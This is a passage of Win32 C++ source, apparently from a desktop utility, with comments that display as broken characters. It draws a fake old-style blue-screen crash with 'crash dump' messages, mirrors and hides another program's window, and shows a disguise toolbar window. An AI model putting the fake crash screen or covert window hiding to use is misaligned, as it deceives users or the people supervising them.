			DeleteObject(A); DeleteObject(B); DeleteObject(C);//��ͼ
		}
		if (Main.Check[CHK_OLDBSOD].Value == TRUE)//�ɰ�����
		{
			int ybegin = 20, xbegin = 2, left, right;
			constexpr int xmax = 640, ymax = 480, s = 8;
			HPEN OBSODPen = CreatePen(PS_SOLID, 1, COLOR_OBSOD_BLUE);
			HBRUSH OBSODBrush = CreateSolidBrush(COLOR_OBSOD_BLUE);
			SetTextColor(bhdc, COLOR_WHITE);
			SelectObject(bhdc, OBSODPen);
			SelectObject(bhdc, OBSODBrush);
			SetBkMode(bhdc, 1);
			HFONT A = CreateFontW(14, 8, 0, 0, FW_THIN, 0, 0, 0, 0, 0, 0, NONANTIALIASED_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Lucida Console");
			SelectObject(bhdc, A);
			Rectangle(bhdc, 0, 0, 640, 480);
			for (int i = 0; i < 9; ++i)
			{
				if (ymax - 50 <= ybegin)break;
				left = right = 0;
				xbegin = 2;

				while (1)
				{
					while (words[i][right] != ' ' && words[i][right] != '\0')++right;
					if (words[i][right] == '\0')break;
					SIZE se;
					GetTextExtentPoint32A(bhdc, &words[i][left], right - left + 1, &se);
					if (se.cx + xbegin <= xmax - 2 * s)
					{
						TextOutA(bhdc, xbegin, ybegin, &words[i][left], right - left + 1);
						xbegin += se.cx;
						left = right + 1;
						right = left;
					}
					else
					{//����Ļ��Ȳ���ʱ���Զ����д�ӡ
						xbegin = 2;
						ybegin += (int)(s * 1.8);
						right = left;
					}
				}
				ybegin += (int)(s * 3.6);
			}
			if (BSODstate >= 50)TextOutA(bhdc, 2, ybegin, "Collecting data for crash dump...", 33), ybegin += s * 2;
			if (BSODstate >= 150)TextOutA(bhdc, 2, ybegin, "Initializing disk for crash dump...", 35);
			DeleteObject(OBSODBrush);
			DeleteObject(OBSODPen);
		}
		EndPaint(hWnd, &ps);
		break;
	}
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

LRESULT CALLBACK CatchProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{//��׽���ڵĴ�����Ӧ����
	PAINTSTRUCT ps;
	switch (message)
	{
	case WM_CREATE:
	{//��������DC�ͻ���bitmap
		ctdc = GetDC(CatchWnd);
		chdc = CreateCompatibleDC(ctdc);
		CatchBitmap = CreateCompatibleBitmap(ctdc, xLength, yLength);
		SelectObject(chdc, CatchBitmap);
		ReleaseDC(hWnd, ctdc);
		break;
	}
	case WM_CLOSE://�ر�
	{
		KillTimer(Main.hWnd, TIMER_UPDATECATCH);
		ReturnWindows();//�Զ��黹����
		TDhWndChild = TDhWndParent = 0;
		DeleteObject(CatchBitmap);
		DestroyWindow(CatchWnd);
		CatchWnd = 0;
		break;
	}
	case WM_PAINT:
	{//�����ػ�(�����ڼ��Ӵ�����ͼ)
		ctdc = BeginPaint(hWnd, &ps);
		if (MonitorTot != 0) {
			HDC hdctd = GetDC(MonitorList[MonitorCur]);
			RECT rc, rc2;
			int left, width, top, height;

			GetClientRect(MonitorList[MonitorCur], &rc);//��ȡ������&�Լ����ڴ�С
			GetClientRect(hWnd, &rc2);

			SelectObject(chdc, WhiteBrush);//��ɫ����
			SelectObject(chdc, WhitePen);
			Rectangle(chdc, 0, 0, rc2.right - rc2.left, rc2.bottom - rc2.top);

			if ((rc2.right - rc2.left) == 0 || (rc2.bottom - rc2.top) == 0 || (rc.right - rc.left) == 0 || (rc.bottom - rc.top) == 0)break;
			const float wh1 = (float)(rc.right - rc.left) / (float)(rc.bottom - rc.top),
				wh2 = (float)(rc2.right - rc2.left) / (float)(rc2.bottom - rc2.top);
			if (wh1 > wh2)
			{//�����Ӵ��ڳ���� > �Լ������
				left = 0;
				width = rc2.right - rc2.left;
				top = (int)((rc2.bottom - rc2.top) / 2 - (rc2.right - rc2.left) / wh1 / 2);
				height = (int)((rc2.right - rc2.left) / wh1);
			}
			else
			{//�����Ӵ��ڳ���� <= �Լ������
				top = 0;
				height = rc2.bottom - rc2.top;
				left = (int)((rc2.right - rc2.left) / 2 - (rc2.bottom - rc2.top) * wh1 / (float)2.0);
				width = (int)((rc2.bottom - rc2.top) * wh1);
			}

			SetStretchBltMode(ctdc, HALFTONE);
			StretchBlt(ctdc, left, top, width, height, hdctd, 0, 0, rc.right - rc.left, rc.bottom - rc.top, SRCCOPY);
			ReleaseDC(MonitorList[MonitorCur], hdctd);//��ͼ

		}
		EndPaint(hWnd, &ps);
		break;
	}
	case WM_SETFOCUS:
	{
		if (MonitorTot != 0)
		{//��ý���ʱע���ȼ�(��һ������)
			AutoRegisterHotKey(hWnd, CATCH_HOTKEY_WNDLEFT, MOD_ALT, VK_LEFT);
			AutoRegisterHotKey(hWnd, CATCH_HOTKEY_WNDRIGHT, MOD_ALT, VK_RIGHT);
			AutoRegisterHotKey(hWnd, CATCH_HOTKEY_ESCAPE, NULL, VK_ESCAPE);
			AutoRegisterHotKey(hWnd, CATCH_HOTKEY_WNDSHOW, MOD_ALT, 'H');
		}
		break;
	}
	case WM_KILLFOCUS: {
		for (int i = CATCH_HOTKEY_WNDLEFT; i < CATCH_HOTKEY_WNDSHOW + 1; ++i)AutoUnregisterHotKey(hWnd, i);
		break; }
	case WM_HOTKEY: {
		if (wParam == CATCH_HOTKEY_WNDLEFT)  --MonitorCur;
		if (wParam == CATCH_HOTKEY_WNDRIGHT) ++MonitorCur;
		if (wParam == CATCH_HOTKEY_ESCAPE) { MonitorTot = 0, KillTimer(hWnd, TIMER_UPDATECATCH); for (int i = CATCH_HOTKEY_WNDLEFT; i < CATCH_HOTKEY_WNDSHOW + 1; ++i)AutoUnregisterHotKey(hWnd, i); }
		if (wParam == CATCH_HOTKEY_WNDSHOW)
			if (IsWindowVisible(MonitorList[MonitorCur]))ShowWindow(MonitorList[MonitorCur], SW_HIDE); else ShowWindow(MonitorList[MonitorCur], SW_SHOW);
		if (MonitorCur == 0)MonitorCur = MonitorTot;
		if (MonitorCur > MonitorTot)MonitorCur = 1;
		if (wParam < CATCH_HOTKEY_WNDSHOW)InvalidateRect(CatchWnd, NULL, FALSE), UpdateWindow(CatchWnd);
		break; }
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

LRESULT CALLBACK FakeProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{//αװ���������ڵ���Ӧ����
	PAINTSTRUCT ps;
	switch (message)
	{
	case WM_CREATE:
	{//��������DC�ͻ���bitmap
		ttdc = GetDC(hWnd);
		thdc = CreateCompatibleDC(ttdc);
		FakeBitmap = CreateCompatibleBitmap(ttdc, 400, 70);
		SelectObject(thdc, FakeBitmap);
		ReleaseDC(FakeWnd, ttdc);
		break;
	}
	case WM_PAINT:
	{
		ttdc = BeginPaint(hWnd, &ps);
		if (FakeToolbarNew)//ֱ�Ӽ򵥵���ͼ�Ϳ�����
			LoadPicture(L"C:\\SAtemp\\Fakenew.jpg", thdc, 0, 0, 1);
		else
			LoadPicture(L"C:\\SAtemp\\Fakeold.jpg", thdc, 0, 0, 1);
		BitBlt(ttdc, 0, 0, 400, 70, thdc, 0, 0, SRCCOPY);
		EndPaint(hWnd, &ps);
		break;
	}
	case WM_LBUTTONDOWN:
	{PostMessage(FakeWnd, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);
	break; }
	case WM_MOUSEMOVE:
	{
		FakeTimer = GetTickCount();
		if (FakenewUp == TRUE)
		{
			FakenewUp = FALSE;
			int typ = 1;
			CreateThread(NULL, 0, FakeNewThread, &typ, 0, NULL);
			Sleep(1);
		}
		break;
	}
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}